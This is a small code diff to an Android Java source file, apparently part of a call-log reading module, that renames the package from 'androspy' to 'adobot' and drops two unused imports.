@@ -1,11 +1,8 @@
-package buddy.ap.com.androspy;
+package buddy.ap.com.adobot;
 
 import android.database.Cursor;
-import android.icu.util.TimeZone;
 import android.net.Uri;
 import android.provider.CallLog;
-
-import org.json.JSONObject;
 
 import java.text.SimpleDateFormat;
 import java.util.Date;
